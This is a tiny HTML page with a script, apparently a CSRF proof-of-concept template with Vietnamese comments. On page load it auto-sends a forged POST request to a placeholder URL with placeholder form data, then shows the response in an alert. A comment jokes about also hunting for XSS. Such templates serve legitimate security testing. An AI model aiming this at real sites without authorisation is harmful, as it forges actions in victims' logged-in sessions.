<html>
<script>
var http = new XMLHttpRequest();
var url = 'Chèn URL'
var params = ' Chèn POST DATA'
http.open('POST',url,true);

http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
http.onreadystatechange = function()   //Gọi hàm khi trạng thái thay đổi

{
	if(http.readyState==4 && http.status == 200){
		alert(http.responseText); // Có thể thêm vài cái Alert cho kiếm thêm cái XSS cho nó phiêu đờ bít
	}
}
http.send(params);
</script>
</html>
